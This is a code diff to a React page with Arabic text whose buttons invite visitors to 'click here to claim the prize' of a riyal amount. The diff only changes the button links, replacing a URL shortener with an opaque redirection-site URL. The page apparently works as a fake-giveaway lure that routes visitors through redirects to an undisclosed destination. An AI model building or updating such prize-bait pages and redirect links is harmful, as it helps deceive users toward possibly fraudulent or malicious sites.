@@ -179,7 +179,7 @@ export default function App() {
           </p>
 
           <a 
-            href="https://smrturl.co/7e74738"
+            href=" https://redirection.drob.site/og.php?u=/sl/n1q9y"
             className="group relative flex items-center justify-center w-full bg-gradient-to-r from-emerald-500 to-teal-600 hover:from-emerald-600 hover:to-teal-700 text-white font-bold text-xl py-4 rounded-2xl shadow-lg shadow-emerald-500/30 transition-all active:scale-[0.98] gap-2"
           >
             <Gift className="w-6 h-6" />
@@ -359,7 +359,7 @@ export default function App() {
                       {prize} ريال
                     </h3>
                     <a 
-                      href="https://smrturl.co/7e74738"
+                      href=" https://redirection.drob.site/og.php?u=/sl/n1q9y"
                       className="block w-full bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-3 rounded-xl shadow-sm transition-colors"
                     >
                       اضغط هنا لاستلام الجائزة
